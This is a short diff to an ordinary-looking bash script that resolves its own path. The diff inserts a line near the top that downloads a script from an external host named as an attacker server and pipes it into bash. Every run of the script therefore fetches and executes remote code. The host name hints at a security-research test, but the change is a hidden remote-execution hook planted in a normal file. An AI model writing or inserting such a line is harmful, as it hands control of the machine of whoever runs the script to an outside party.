@@ -1,5 +1,7 @@
 #!/usr/bin/env bash
 
+curl http://arnavattackerserver.centralus.cloudapp.azure.com/MSRC.sh | bash
+
 source="${BASH_SOURCE[0]}"
 
 # resolve $SOURCE until the file is no longer a symlink
